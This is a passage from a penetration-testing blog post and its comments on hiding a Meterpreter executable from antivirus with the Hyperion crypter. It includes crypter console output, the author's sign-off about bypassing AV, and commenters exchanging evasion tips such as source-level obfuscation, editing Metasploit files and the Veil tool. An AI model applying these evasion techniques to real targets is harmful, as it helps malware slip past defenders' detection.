+<em>Rounded up to a multiple of key size: 0x4150</em><br />
+<em>Generated Checksum: 0xcf0cc</em><br />
+<em>Generated Encryption Key: 0x0 0x2 0x1 0x2 0x3 0x3 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0</em></p>
+<p><em>Written encrypted input file as fasm array to:</em><br />
+<em>-&gt; Src\FasmContainer32\infile.asm</em></p>
+<p><em>Written input file&#8217;s image base to:</em><br />
+<em>-&gt; Src\FasmContainer32\imagebase.asm</em></p>
+<p><em>Written input file&#8217;s image size to:</em><br />
+<em>-&gt; Src\FasmContainer32\sizeofimage.asm</em></p>
+<p><em>Written keysize to:</em><br />
+<em>-&gt; Src\FasmContainer32\keysize.inc</em></p>
+<p><em>Starting FASM with the following parameters:</em><br />
+<em>Commandline: Fasm\FASM.EXE Src\FasmContainer32\main.asm encryptedmet.exe</em><br />
+<em>FASM Working Directory: C:\MinGW\bin\Hyperion-1.0</em></p>
+<p><em>Executing fasm.exe</em></p>
+<p><em>flat assembler version 1.69.31 (1020166 kilobytes memory)</em><br />
+<em>5 passes, 0.1 seconds, 35328 bytes.</em></p>
+<p>And that&#8217;s it.  Hopefully either or a combination of both of these techniques have helped you to bypass the antivirus product you are going against.</p>
+<p>Good luck, and let me know if you have any questions!</p>
+<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-269" class="share-twitter sd-button share-icon" href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-269" class="share-linkedin sd-button share-icon" href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-269" class="share-facebook sd-button share-icon" href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li><a href="#" class="sharing-anchor sd-button share-more"><span>More</span></a></li><li class="share-end"></li></ul><div class="sharing-hidden"><div class="inner" style="display: none;"><ul><li class="share-print"><a rel="nofollow noopener noreferrer" data-shared="" class="share-print sd-button share-icon" href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#print" target="_blank" title="Click to print"><span>Print</span></a></li><li class="share-email"><a rel="nofollow noopener noreferrer" data-shared="" class="share-email sd-button share-icon" href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?share=email" target="_blank" title="Click to email this to a friend"><span>Email</span></a></li><li class="share-end"></li><li class="share-end"></li></ul></div></div></div></div></div>					</div><!-- .entry-content -->
+
+		<footer class="entry-meta">
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-## -->
+</div><!-- .hentry-wrapper -->
+
+				<nav role="navigation" id="nav-below" class="post-navigation">
+		<h1 class="screen-reader-text">Post navigation</h1>
+
+	
+		<div class="nav-previous"><a href="https://www.christophertruncer.com/sqlmap-data-trick/" rel="prev"><span class="meta-nav">&larr;</span> SQLMap &#8211;data trick</a></div>		<div class="nav-next"><a href="https://www.christophertruncer.com/hack3rcon-3-ctf-event/" rel="next">Hack3rcon 3 CTF Writeups! <span class="meta-nav">&rarr;</span></a></div>
+	
+	</nav><!-- #nav-below -->
+	
+			
+<div id="comments" class="comments-area">
+
+	
+			<h2 class="comments-title">
+			30 thoughts on &ldquo;<span>Bypass Antivirus with Meterpreter as the Payload &#038; Hyperion Fun</span>&rdquo;		</h2>
+
+		
+		<ol class="comment-list">
+			
+	<li id="comment-900" class="comment even thread-even depth-1 parent">
+		<article id="div-comment-900" class="comment-body clear">
+			<div class="comment-content">
+				<p>Thanks for the great tutorial.</p>
+<p>I gave this ago. After completing the first phase where I created my own custom template and compiled the payload (without using Hyperion), I got 3 detected om NoVirusThanks.</p>
+<p>I went through the tutorial and ran it through Hyperion as instructed, tested the new .exe and it was now detected 4 times, (mostly as packers as you pointed out).</p>
+<p>Is there any other techniques used in combination with what you&#8217;ve got here to get better results for evasion?</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=900#respond' data-commentid="900" data-postid="269" data-belowelement="div-comment-900" data-respondelement="respond" data-replyto="Reply to Max" aria-label='Reply to Max'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/2f12435b246b2f4cde3f6ee75086f738?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/2f12435b246b2f4cde3f6ee75086f738?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">Max</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-900">
+						<time datetime="2012-08-29T00:35:14-06:00">
+							August 29, 2012 at 12:35 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-905" class="comment byuser comment-author-ctruncer bypostauthor odd alt depth-2 parent">
+		<article id="div-comment-905" class="comment-body clear">
+			<div class="comment-content">
+				<p>There is a different technique that can be used, but the reason it is caught by a small percentage of AV is how the meterpreter payload is created with msfvenom (beyond just the configuration settings of the payload that we set).  It would require editing some of Metasploit&#8217;s ruby files, which I plan on doing and writing a future post on doing so.</p>
+<p>The hyperion developers have stated that they realize it is currently written in a &#8220;signature friendly&#8221; manner.  They have stated they plan on releasing an update to the tool to make it much harder to write an AV signature for.</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=905#respond' data-commentid="905" data-postid="269" data-belowelement="div-comment-905" data-respondelement="respond" data-replyto="Reply to CTruncer" aria-label='Reply to CTruncer'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn"><a href='http://www.christophertruncer.com' rel='external nofollow ugc' class='url'>CTruncer</a></cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-905">
+						<time datetime="2012-08-29T08:12:35-06:00">
+							August 29, 2012 at 8:12 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-1069" class="comment even depth-3 parent">
+		<article id="div-comment-1069" class="comment-body clear">
+			<div class="comment-content">
+				<p>Did you allready wrote this Tutorial?</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=1069#respond' data-commentid="1069" data-postid="269" data-belowelement="div-comment-1069" data-respondelement="respond" data-replyto="Reply to Oprim" aria-label='Reply to Oprim'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/c63105fa2717f06c2d73fcb2fa58aac6?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/c63105fa2717f06c2d73fcb2fa58aac6?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">Oprim</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-1069">
+						<time datetime="2013-08-24T15:52:59-06:00">
+							August 24, 2013 at 3:52 pm						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-1070" class="comment byuser comment-author-ctruncer bypostauthor odd alt depth-4 parent">
+		<article id="div-comment-1070" class="comment-body clear">
+			<div class="comment-content">
+				<p>I&#8217;m not sure what you mean by this..?</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=1070#respond' data-commentid="1070" data-postid="269" data-belowelement="div-comment-1070" data-respondelement="respond" data-replyto="Reply to CTruncer" aria-label='Reply to CTruncer'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn"><a href='http://www.christophertruncer.com' rel='external nofollow ugc' class='url'>CTruncer</a></cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-1070">
+						<time datetime="2013-08-24T16:40:57-06:00">
+							August 24, 2013 at 4:40 pm						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-1071" class="comment even depth-5 parent">
+		<article id="div-comment-1071" class="comment-body clear">
+			<div class="comment-content">
+				<p>You Worte  that you can Bypass AV&#8217;s they Look for payloads their createt with msfvenom. You Allready wrote that you can Bypass it with Editing some ruby of metasploit and that you are planning to do a post for that. So my question is if you Allready wrote this post.</p>
+							</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/c63105fa2717f06c2d73fcb2fa58aac6?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/c63105fa2717f06c2d73fcb2fa58aac6?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">Oprim</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-1071">
+						<time datetime="2013-08-24T16:48:51-06:00">
+							August 24, 2013 at 4:48 pm						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+
+	<li id="comment-1072" class="comment byuser comment-author-ctruncer bypostauthor odd alt depth-5">
+		<article id="div-comment-1072" class="comment-body clear">
+			<div class="comment-content">
+				<p>Sorry, I saw your comment in e-mail, but not that it was in relation to another comment of mine.</p>
+<p>I haven&#8217;t made a post on modifying the ruby files yet, but myself and two other guys released a tool called Veil (blog post is published on here) which creates payloads that bypass AV.  </p>
+<p>I do still need to write that post you&#8217;re referencing though, 🙂</p>
+							</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn"><a href='http://www.christophertruncer.com' rel='external nofollow ugc' class='url'>CTruncer</a></cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-1072">
+						<time datetime="2013-08-24T16:58:36-06:00">
+							August 24, 2013 at 4:58 pm						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+
+	<li id="comment-1074" class="comment even depth-5 parent">
+		<article id="div-comment-1074" class="comment-body clear">
+			<div class="comment-content">
+				<p>Yes I know ^^ But Veil dosn&#8217;t work for me on Ubuntu 12.04. The Terminal saya Error in line 17-19</p>
+							</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/c63105fa2717f06c2d73fcb2fa58aac6?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/c63105fa2717f06c2d73fcb2fa58aac6?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">Oprim</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-1074">
+						<time datetime="2013-08-25T13:58:59-06:00">
+							August 25, 2013 at 1:58 pm						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+
+	<li id="comment-1075" class="comment byuser comment-author-ctruncer bypostauthor odd alt depth-5">
+		<article id="div-comment-1075" class="comment-body clear">
+			<div class="comment-content">
+				<p>Might help for you to talk to all three of us via twitter.  Also, I thought Veil should work on ubuntu, I&#8217;ll have to test.  Did you run the setup script?  On another note, Veil was specifically designed to run on Kali, so that&#8217;s our usual recommendation on what to run it on.</p>
+							</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn"><a href='http://www.christophertruncer.com' rel='external nofollow ugc' class='url'>CTruncer</a></cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-1075">
+						<time datetime="2013-08-25T15:30:46-06:00">
+							August 25, 2013 at 3:30 pm						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+
+	<li id="comment-901" class="comment even thread-odd thread-alt depth-1 parent">
+		<article id="div-comment-901" class="comment-body clear">
+			<div class="comment-content">
+				<p>I&#8217;ve tried this tutorial and stuck with detection of the resulting payload by Kaspersky Internet Security 2012 (HEUR:Trojan.Win32.Generic).</p>
+<p>I played with AV evasion and Hyperion before and made a payload undetectable; maybe the heuristic scanner of KIS 2012 now has a clue on how to detect such things — I don&#8217;t know. I had some issues with a payload crypted by Hyperion: it succesfully ran in Windows XP/Windows 7 x86 and failed in Windows 7 x64. Could you check please does this happen to your system(s)?</p>
+<p>The Hyperion has some logging features which help to debug a launch of an encrypted executable. I&#8217;ve made a patch for Hyperion-1.0 for my own puproses that disables any logging (I hope belial wouldn&#8217;t be offended by this)&#8230;</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=901#respond' data-commentid="901" data-postid="269" data-belowelement="div-comment-901" data-respondelement="respond" data-replyto="Reply to jabberd" aria-label='Reply to jabberd'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/315101977fa6d0f05d6404a8c322c906?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/315101977fa6d0f05d6404a8c322c906?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">jabberd</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-901">
+						<time datetime="2012-08-29T04:45:45-06:00">
+							August 29, 2012 at 4:45 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-902" class="comment odd alt depth-2 parent">
+		<article id="div-comment-902" class="comment-body clear">
+			<div class="comment-content">
+				<p>Sorry, I&#8217;ve just remembered the issue with x64 was not with the Hyperion &#8211; it was with my own assembly build based on FasmAES library (which is used in Hyperion, by the way) 🙁</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=902#respond' data-commentid="902" data-postid="269" data-belowelement="div-comment-902" data-respondelement="respond" data-replyto="Reply to jabberd" aria-label='Reply to jabberd'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/315101977fa6d0f05d6404a8c322c906?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/315101977fa6d0f05d6404a8c322c906?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">jabberd</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-902">
+						<time datetime="2012-08-29T07:13:28-06:00">
+							August 29, 2012 at 7:13 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-906" class="comment byuser comment-author-ctruncer bypostauthor even depth-3 parent">
+		<article id="div-comment-906" class="comment-body clear">
+			<div class="comment-content">
+				<p>Glad you were able to figure it out.  </p>
+<p>With everything I&#8217;ve generated using these techniques, Kaspersky is that one AV vendor that I&#8217;ve seen consistently detect the payload.  Have you tried playing with adding addition rounds of encryption to the hyperion output?  Also, once an update comes out for Hyperion to make it not as signature friendly it will be interesting to re-test this method.</p>
+<p>I&#8217;ve actually yet to go against Kaspersky on a pen test, but it is something I&#8217;d like to work on bypassing now.</p>
+<p>Only other option is editing some of Metasploit&#8217;s executable generation files, which I plan on doing but will write up in a future post.</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=906#respond' data-commentid="906" data-postid="269" data-belowelement="div-comment-906" data-respondelement="respond" data-replyto="Reply to CTruncer" aria-label='Reply to CTruncer'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn"><a href='http://www.christophertruncer.com' rel='external nofollow ugc' class='url'>CTruncer</a></cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-906">
+						<time datetime="2012-08-29T08:15:57-06:00">
+							August 29, 2012 at 8:15 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-908" class="comment odd alt depth-4">
+		<article id="div-comment-908" class="comment-body clear">
+			<div class="comment-content">
+				<p>I&#8217;ve found out that simple &#8220;Hello world&#8221; C-program compiled by MinGW gcc and encrypted by Hyperion triggers AV&#8217;s detection (<a href="http://vscan.novirusthanks.org/analysis/c6dbf81a3cc9f27e7f7d911e53d24d51/MS1jcnlwdGVkLWV4ZQ==/" rel="nofollow ugc">http://vscan.novirusthanks.org/analysis/c6dbf81a3cc9f27e7f7d911e53d24d51/MS1jcnlwdGVkLWV4ZQ==/</a>)<br />
+Unfortunately, to avoid the detection, Hyperion should use some method to make procedures from entry point to decryption modified at least for each build. Polymorphic generation of the container is in Hyperion&#8217;s TODO&#8230;</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=908#respond' data-commentid="908" data-postid="269" data-belowelement="div-comment-908" data-respondelement="respond" data-replyto="Reply to jabberd" aria-label='Reply to jabberd'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/315101977fa6d0f05d6404a8c322c906?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/315101977fa6d0f05d6404a8c322c906?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">jabberd</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-908">
+						<time datetime="2012-08-29T08:44:55-06:00">
+							August 29, 2012 at 8:44 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+
+	<li id="comment-909" class="comment even depth-4 parent">
+		<article id="div-comment-909" class="comment-body clear">
+			<div class="comment-content">
+				<p>I tried to use different encoders, the number of iterations, combinations of encoders &#8211; AVs seem to detect them every time, and the detection rate increases as I add an extra iteration/pipe to another encoder. I tried an obfuscation technique that helped: 1) disassembly with metasm; 2) some modification of the source; 3) re-assembly of the modified .asm source.<br />
+It would be great if we had a tool that automates the source-level obfuscation, but I think this is too complex and sophisticated task.</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=909#respond' data-commentid="909" data-postid="269" data-belowelement="div-comment-909" data-respondelement="respond" data-replyto="Reply to jabberd" aria-label='Reply to jabberd'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/315101977fa6d0f05d6404a8c322c906?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/315101977fa6d0f05d6404a8c322c906?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">jabberd</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-909">
+						<time datetime="2012-08-29T09:00:35-06:00">
+							August 29, 2012 at 9:00 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-910" class="comment byuser comment-author-ctruncer bypostauthor odd alt depth-5">
+		<article id="div-comment-910" class="comment-body clear">
+			<div class="comment-content">
+				<p>Unfortunately you&#8217;re probably right.  Probably is worth investigating to see if any automated method of modifying the source can help bypass AV.  It would be nice.  But also like you said, Hyperion itself needs to be changed in order to help bypass AV detection.  Hopefully that TODO list gets done soon&#8230;</p>
+							</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn"><a href='http://www.christophertruncer.com' rel='external nofollow ugc' class='url'>CTruncer</a></cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-910">
+						<time datetime="2012-08-29T09:20:39-06:00">
+							August 29, 2012 at 9:20 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+
+	<li id="comment-904" class="comment even thread-even depth-1 parent">
+		<article id="div-comment-904" class="comment-body clear">
+			<div class="comment-content">
+				<p>First off thank you very much for the article. I have a question. After generating the payload in exe, do we have to place this exe at a particular location like msf3/data/templates/template_x86_windows.exe because how can we specify to the MSF to use our custom template? Also I have read somewhere that meterpreter is delivered as a DLL and not as an exe. Then how can be have payload in exe format? Some clarification will be really helpful.</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=904#respond' data-commentid="904" data-postid="269" data-belowelement="div-comment-904" data-respondelement="respond" data-replyto="Reply to void_in" aria-label='Reply to void_in'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/1443bef7663f2d6c3db9927567a3d11a?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/1443bef7663f2d6c3db9927567a3d11a?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn">void_in</cite>					</div><!-- .comment-author -->
+					<a href="https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/#comment-904">
+						<time datetime="2012-08-29T08:10:17-06:00">
+							August 29, 2012 at 8:10 am						</time>
+					</a>
+									</div><!-- .comment-metadata -->
+
+							</footer><!-- .comment-meta -->
+
+		</article><!-- .comment-body -->
+
+	<ul class="children">
+
+	<li id="comment-907" class="comment byuser comment-author-ctruncer bypostauthor odd alt depth-2 parent">
+		<article id="div-comment-907" class="comment-body clear">
+			<div class="comment-content">
+				<p>So, in writing this article, I didn&#8217;t actually create a template that all future builds of meterpreter through msfvenom would use.  What this is doing is basically creating a &#8220;one time&#8221; executable payload.  Once compiled through gcc.exe you can simply double click that .exe file on Windows and receive your callback.  I prefer this method as I can customize the template as a whole everytime I need/want to create an executable payload.</p>
+<p>This method puts meterpreter into an .exe format.  Meterpreter is capable of being delivered by injecting a dll into a process, but that was not the method of delivery in this article.  I wanted to show how to create an executable that could be uploaded as a custom payload through Metasploit, or assuming you have upload access to a box, legitimately dropping it on a machine and executing it without detection.</p>
+<p>If you have any other questions, let me know.</p>
+				<div class="reply clear"><a rel='nofollow' class='comment-reply-link' href='https://www.christophertruncer.com/bypass-antivirus-with-meterpreter-as-the-payload-hyperion-fun/?replytocom=907#respond' data-commentid="907" data-postid="269" data-belowelement="div-comment-907" data-respondelement="respond" data-replyto="Reply to CTruncer" aria-label='Reply to CTruncer'>Reply</a></div>			</div><!-- .comment-content -->
+			<footer class="comment-meta">
+				<img alt='' src='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=32&#038;d=retro&#038;r=r' srcset='https://secure.gravatar.com/avatar/642710444f9f3c815ee898c72b6481ed?s=64&#038;d=retro&#038;r=r 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy'/>
+				<div class="comment-metadata">
+					<div class="comment-author vcard">
+						<cite class="fn"><a href='http://www.christophertruncer.com' rel='external nofollow ugc' class='url'>CTruncer</a></cite>					</div><!-- .comment-author -->
